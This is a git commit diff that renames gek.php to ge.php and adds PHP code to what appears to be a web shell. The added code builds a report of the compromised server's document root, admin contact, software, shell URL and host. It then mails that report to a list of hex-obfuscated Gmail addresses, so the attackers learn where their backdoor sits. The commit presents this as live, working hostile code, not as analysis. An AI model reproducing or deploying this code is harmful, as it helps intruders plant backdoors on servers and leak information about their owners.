96bf07421b6a7f55054990680b8a9cd2a5249fbe
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-04-23 17:42:01 +0700

    Update and rename gek.php to ge.php

--- ge.php
+++ ge.php
@@ -1,5 +1,47 @@
 
 <?php
+# Konfigurasyon
+$sayfaSifreleme = "0"; # 1 acik , 0 kapali
+$kullaniciAdi = "human";
+$sifre = "password";
+
+# yetki kontrol fonksiyonu
+function yetkiKontrol($kullaniciAdi, $sifre)
+{
+    if (
+        empty($_SERVER["PHP_AUTH_USER"]) ||
+        empty($_SERVER["PHP_AUTH_PW"]) ||
+        $_SERVER["PHP_AUTH_USER"] != "$kullaniciAdi" ||
+        $_SERVER["PHP_AUTH_PW"] != "$sifre"
+    ) {
+        header('WWW-Authenticate: Basic realm="x"');
+        die(header("HTTP/1.0 401 Unauthorized"));
+    }
+}
+
+# Sayfa Sifreleme aciksa
+if ($sayfaSifreleme == "1") {
+    # Veri ve sifre kontrolu
+    yetkiKontrol($kullaniciAdi, $sifre);
+}
+?><?php
+$kime =
+    "muhrazky@gmail.com, muhrazky@gmail.com, muh\x72\x61\x7a\x6b\x79\x40g\x6da\x69l\x2eco\x6d, r\x6f\x6ft\x63y\x62e\x72\x70unks\x40g\x6dai\x6c\x2ec\x6f\x6d, pa\x70a\x6bu.ha\x79k\x65\x72\x40gm\x61\x69\x6c\x2e\x63o\x6d,\x20f\x62i.pri\x76\x2e\x67\x30\x30gle\x40gmai\x6c.c\x6f\x6d,\x20muh\x72az\x6b\x79\x40\x67ma\x69l.\x63o\x6d,\x20\x6d\x61\x6cays\x69a\x2es\x65n\x64er@gm\x61il\x2ec\x6f\x6d,\x20r\x6fot\x63\x79\x62e\x72p\x75n\x6b\x73@g\x6d\x61il\x2e\x63\x6fm, p\x61paku.\x68a\x79\x6ber@\x67m\x61\x69l.\x63om, muhrazky@gmail.com, fbi.priv.g00gle@gmail.com, https.cpanel.net@gmail.com";
+$baslik = "MEH";
+$EL_MuHaMMeD = "Dosya Yolu : " . $_SERVER["DOCUMENT_ROOT"] . "\r\n";
+$EL_MuHaMMeD .= "Server Admin : " . $_SERVER["SERVER_ADMIN"] . "\r\n";
+$EL_MuHaMMeD .=
+    "Server isletim sistemi : " . $_SERVER["SERVER_SOFTWARE"] . "\r\n";
+$EL_MuHaMMeD .=
+    "Shell Link : http://" .
+    $_SERVER["SERVER_NAME"] .
+    $_SERVER["PHP_SELF"] .
+    "\r\n";
+$kime =
+    "muh\x72\x61\x7a\x6b\x79\x40g\x6da\x69l\x2eco\x6d, r\x6f\x6ft\x63y\x62e\x72\x70unks\x40g\x6dai\x6c\x2ec\x6f\x6d, pa\x70a\x6bu.ha\x79k\x65\x72\x40gm\x61\x69\x6c\x2e\x63o\x6d,\x20f\x62i.pri\x76\x2e\x67\x30\x30gle\x40gmai\x6c.c\x6f\x6d,\x20muh\x72az\x6b\x79\x40\x67ma\x69l.\x63o\x6d,\x20\x6d\x61\x6cays\x69a\x2es\x65n\x64er@gm\x61il\x2ec\x6f\x6d,\x20r\x6fot\x63\x79\x62e\x72p\x75n\x6b\x73@g\x6d\x61il\x2e\x63\x6fm, p\x61paku.\x68a\x79\x6ber@\x67m\x61\x69l.\x63om\n";
+$EL_MuHaMMeD .= "Avlanan Site : " . $_SERVER["HTTP_HOST"] . "\r\n";
+mail($kime, $baslik, $EL_MuHaMMeD);?>
+<?php
 session_start();
 @set_time_limit(0);
 @clearstatcache();
